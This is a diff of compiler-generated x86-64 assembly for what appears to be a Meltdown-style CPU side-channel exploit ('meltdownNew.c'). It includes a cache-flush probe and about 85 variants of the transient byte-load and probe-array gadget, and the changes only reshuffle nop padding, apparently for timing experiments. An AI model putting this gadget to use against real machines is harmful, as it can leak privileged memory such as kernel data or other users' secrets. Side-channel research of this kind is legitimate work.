@@ -1,4 +1,4 @@
-	.file	"meltdownFrichetten.c"
+	.file	"meltdownNew.c"
 	.text
 	.type	sigaction_segv, @function
 sigaction_segv:
@@ -75,7 +75,7 @@ probe_one:
 	movq	%rax, -2352(%rbp)
 	movq	-2352(%rbp), %rax
 #APP
-# 106 "meltdownFrichetten.c" 1
+# 104 "meltdownNew.c" 1
 	mfence
 	clflush	0(%rax)
 # 0 "" 2
@@ -92,7 +92,7 @@ probe_one:
 	movq	-2408(%rbp), %rdx
 	movq	-2416(%rbp), %rcx
 #APP
-# 158 "meltdownFrichetten.c" 1
+# 156 "meltdownNew.c" 1
 	.global __speculative_byte_load_exit 
 	92:                              
 	xorq	%rax, %rax
@@ -1123,44 +1123,44 @@ probe_one:
 .Lprobe_one_win0_var1:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
 	nop
 	nop
 	jz	92b
 	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 2
 .Lprobe_one_win0_var2:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
 	nop
-	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	jz	92b
+	nop
+	nop
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 3
 .Lprobe_one_win0_var3:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
 	movb	(%rdx), %al
 	nop
 	nop
 	shlq	$0xc, %rax
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -1169,14 +1169,14 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 5
@@ -1187,10 +1187,10 @@ probe_one:
 	nop
 	movb	(%rdx), %al
 	nop
-	nop
 	shlq	$0xc, %rax
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -1198,16 +1198,16 @@ probe_one:
 .Lprobe_one_win0_var6:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
 	nop
 	nop
-	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 7
 .Lprobe_one_win0_var7:
@@ -1215,28 +1215,28 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	nop
+	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
+	nop
 	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 8
 .Lprobe_one_win0_var8:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
 	nop
 	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 9
@@ -1244,13 +1244,13 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
-	nop
-	nop
-	nop
 	jz	92b
+	nop
+	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
@@ -1261,11 +1261,11 @@ probe_one:
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
-	nop
 	jz	92b
 	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -1274,14 +1274,14 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	movb	(%rdx), %al
 	nop
+	nop
+	nop
+	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
+	nop
 	jz	92b
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 12
@@ -1290,58 +1290,58 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
 	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 13
 .Lprobe_one_win0_var13:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
 	nop
 	nop
 	shlq	$0xc, %rax
 	nop
 	jz	92b
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 14
 .Lprobe_one_win0_var14:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
 	nop
 	shlq	$0xc, %rax
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 15
 .Lprobe_one_win0_var15:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
-	shlq	$0xc, %rax
 	nop
+	nop
+	nop
+	shlq	$0xc, %rax
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 16
@@ -1355,35 +1355,35 @@ probe_one:
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 17
 .Lprobe_one_win0_var17:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
 	nop
 	nop
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
+	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 18
 .Lprobe_one_win0_var18:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
 	jz	92b
 	nop
 	nop
@@ -1397,21 +1397,21 @@ probe_one:
 	nop
 	nop
 	nop
-	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 20
 .Lprobe_one_win0_var20:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	nop
 	shlq	$0xc, %rax
 	jz	92b
@@ -1423,16 +1423,16 @@ probe_one:
 .Lprobe_one_win0_var21:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
+	nop
+	nop
 	jz	92b
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 22
 .Lprobe_one_win0_var22:
@@ -1440,12 +1440,12 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	movb	(%rdx), %al
+	nop
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
-	nop
-	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
@@ -1455,14 +1455,14 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	nop
-	nop
 	movb	(%rdx), %al
 	nop
+	nop
+	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 24
 .Lprobe_one_win0_var24:
@@ -1470,14 +1470,14 @@ probe_one:
 	addq	$32, %rsp
 	movb	(%rdx), %al
 	nop
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
+	nop
+	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 25
 .Lprobe_one_win0_var25:
@@ -1489,25 +1489,25 @@ probe_one:
 	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 26
 .Lprobe_one_win0_var26:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
 	nop
 	jz	92b
 	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 27
 .Lprobe_one_win0_var27:
@@ -1529,12 +1529,12 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
 	nop
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	nop
 	nop
 	nop
@@ -1546,12 +1546,12 @@ probe_one:
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
-	nop
 	jz	92b
 	nop
 	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 30
@@ -1559,12 +1559,12 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	nop
 	nop
@@ -1573,16 +1573,16 @@ probe_one:
 .Lprobe_one_win0_var31:
 	popq	%rax
 	addq	$32, %rsp
-	movb	(%rdx), %al
 	nop
+	nop
+	nop
+	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
 	jz	92b
 	nop
 	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 32
 .Lprobe_one_win0_var32:
@@ -1590,9 +1590,9 @@ probe_one:
 	addq	$32, %rsp
 	movb	(%rdx), %al
 	nop
-	nop
 	shlq	$0xc, %rax
 	jz	92b
+	nop
 	nop
 	nop
 	nop
@@ -1603,14 +1603,14 @@ probe_one:
 .Lprobe_one_win0_var33:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
 	nop
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -1619,14 +1619,14 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
 	movb	(%rdx), %al
 	nop
+	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 35
@@ -1634,6 +1634,7 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
 	movb	(%rdx), %al
 	nop
 	nop
@@ -1642,35 +1643,34 @@ probe_one:
 	shlq	$0xc, %rax
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 36
 .Lprobe_one_win0_var36:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
-	nop
-	nop
-	nop
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 37
 .Lprobe_one_win0_var37:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
 	movb	(%rdx), %al
 	nop
-	nop
-	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -1680,29 +1680,29 @@ probe_one:
 	addq	$32, %rsp
 	movb	(%rdx), %al
 	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
+	nop
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 39
 .Lprobe_one_win0_var39:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 40
 .Lprobe_one_win0_var40:
@@ -1710,12 +1710,12 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	nop
-	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
+	nop
+	nop
 	jz	92b
+	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
@@ -1723,14 +1723,14 @@ probe_one:
 .Lprobe_one_win0_var41:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
-	nop
-	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -1739,29 +1739,29 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
+	nop
+	nop
 	jz	92b
 	nop
 	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 43
 .Lprobe_one_win0_var43:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
+	nop
+	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 44
@@ -1771,42 +1771,42 @@ probe_one:
 	nop
 	movb	(%rdx), %al
 	nop
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
+	nop
 	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 45
 .Lprobe_one_win0_var45:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
-	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	nop
+	nop
+	jz	92b
+	nop
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 46
 .Lprobe_one_win0_var46:
 	popq	%rax
 	addq	$32, %rsp
-	movb	(%rdx), %al
 	nop
+	nop
+	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
 	nop
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 47
@@ -1814,59 +1814,59 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
 	nop
 	nop
 	nop
 	jz	92b
 	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 48
 .Lprobe_one_win0_var48:
 	popq	%rax
 	addq	$32, %rsp
-	movb	(%rdx), %al
-	shlq	$0xc, %rax
 	nop
+	nop
+	movb	(%rdx), %al
+	nop
+	nop
+	shlq	$0xc, %rax
 	nop
 	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 49
 .Lprobe_one_win0_var49:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
-	nop
 	nop
 	shlq	$0xc, %rax
 	nop
-	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	nop
+	jz	92b
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 50
 .Lprobe_one_win0_var50:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
 	nop
 	jz	92b
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 51
@@ -1876,10 +1876,10 @@ probe_one:
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
 	nop
 	nop
 	nop
@@ -1888,88 +1888,88 @@ probe_one:
 .Lprobe_one_win0_var52:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
 	nop
 	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 53
 .Lprobe_one_win0_var53:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 54
 .Lprobe_one_win0_var54:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 55
 .Lprobe_one_win0_var55:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
 	movb	(%rdx), %al
+	nop
 	nop
 	shlq	$0xc, %rax
 	nop
 	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 56
 .Lprobe_one_win0_var56:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
 	movb	(%rdx), %al
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
-	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 57
 .Lprobe_one_win0_var57:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
-	nop
-	nop
 	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
@@ -1980,42 +1980,42 @@ probe_one:
 	addq	$32, %rsp
 	movb	(%rdx), %al
 	nop
+	nop
 	shlq	$0xc, %rax
 	nop
 	nop
-	nop
-	nop
-	nop
 	jz	92b
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 59
 .Lprobe_one_win0_var59:
 	popq	%rax
 	addq	$32, %rsp
-	movb	(%rdx), %al
 	nop
+	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
 	nop
-	nop
-	nop
-	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 60
 .Lprobe_one_win0_var60:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
+	nop
+	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -2023,46 +2023,46 @@ probe_one:
 .Lprobe_one_win0_var61:
 	popq	%rax
 	addq	$32, %rsp
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
 	nop
 	nop
+	nop
+	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 62
 .Lprobe_one_win0_var62:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
+	nop
 	nop
 	nop
 	shlq	$0xc, %rax
 	jz	92b
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 63
 .Lprobe_one_win0_var63:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
 	jz	92b
 	nop
+	nop
+	nop
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 64
 .Lprobe_one_win0_var64:
@@ -2071,11 +2071,11 @@ probe_one:
 	nop
 	nop
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -2084,45 +2084,45 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
 	movb	(%rdx), %al
 	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 66
 .Lprobe_one_win0_var66:
 	popq	%rax
 	addq	$32, %rsp
+	nop
+	nop
+	nop
+	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 67
 .Lprobe_one_win0_var67:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
 	nop
+	nop
+	nop
 	jz	92b
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 68
 .Lprobe_one_win0_var68:
@@ -2130,24 +2130,24 @@ probe_one:
 	addq	$32, %rsp
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
 	jz	92b
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
-	nop
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 69
 .Lprobe_one_win0_var69:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
-	shlq	$0xc, %rax
 	nop
+	nop
+	nop
+	shlq	$0xc, %rax
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
@@ -2160,13 +2160,13 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	nop
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
+	nop
+	nop
+	nop
 	jz	92b
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 71
@@ -2175,8 +2175,8 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
 	nop
 	nop
@@ -2189,10 +2189,10 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	movb	(%rdx), %al
-	nop
-	nop
 	shlq	$0xc, %rax
+	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
 	nop
 	nop
@@ -2204,13 +2204,13 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
 	jz	92b
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
@@ -2220,28 +2220,28 @@ probe_one:
 	addq	$32, %rsp
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
-	nop
 	jz	92b
 	nop
 	nop
 	nop
-	movq	(%rcx, %rax, 1), %rbx
 	nop
+	nop
+	movq	(%rcx, %rax, 1), %rbx
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 75
 .Lprobe_one_win0_var75:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
 	nop
+	nop
 	shlq	$0xc, %rax
+	nop
+	nop
 	jz	92b
-	nop
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 76
@@ -2249,29 +2249,29 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
+	nop
 	movb	(%rdx), %al
+	nop
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
 	jz	92b
-	nop
-	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
-	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 77
 .Lprobe_one_win0_var77:
 	popq	%rax
 	addq	$32, %rsp
-	nop
-	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
-	nop
-	nop
 	jz	92b
+	nop
+	nop
+	nop
+	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
 	jmp	.Lprobe_one_win0_continue
 ## Variant 78
@@ -2279,15 +2279,15 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
-	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	jz	92b
 	nop
 	nop
 	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 79
 .Lprobe_one_win0_var79:
@@ -2297,12 +2297,12 @@ probe_one:
 	nop
 	nop
 	nop
-	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 80
 .Lprobe_one_win0_var80:
@@ -2310,11 +2310,11 @@ probe_one:
 	addq	$32, %rsp
 	nop
 	movb	(%rdx), %al
+	nop
 	shlq	$0xc, %rax
 	nop
-	nop
-	nop
 	jz	92b
+	nop
 	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
@@ -2323,12 +2323,12 @@ probe_one:
 .Lprobe_one_win0_var81:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
 	shlq	$0xc, %rax
 	nop
+	nop
 	jz	92b
-	nop
-	nop
 	nop
 	movq	(%rcx, %rax, 1), %rbx
 	nop
@@ -2338,16 +2338,16 @@ probe_one:
 .Lprobe_one_win0_var82:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
-	nop
-	nop
-	nop
 	shlq	$0xc, %rax
-	nop
 	jz	92b
 	nop
 	nop
+	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 83
 .Lprobe_one_win0_var83:
@@ -2355,13 +2355,13 @@ probe_one:
 	addq	$32, %rsp
 	movb	(%rdx), %al
 	nop
+	nop
+	nop
+	nop
+	nop
 	shlq	$0xc, %rax
-	nop
-	nop
 	jz	92b
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 84
@@ -2369,29 +2369,29 @@ probe_one:
 	popq	%rax
 	addq	$32, %rsp
 	nop
-	nop
 	movb	(%rdx), %al
-	nop
 	shlq	$0xc, %rax
 	nop
 	nop
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
+	nop
+	nop
 	jmp	.Lprobe_one_win0_continue
 ## Variant 85
 .Lprobe_one_win0_var85:
 	popq	%rax
 	addq	$32, %rsp
+	nop
 	movb	(%rdx), %al
+	nop
 	nop
 	nop
 	shlq	$0xc, %rax
 	jz	92b
 	nop
 	movq	(%rcx, %rax, 1), %rbx
-	nop
-	nop
 	nop
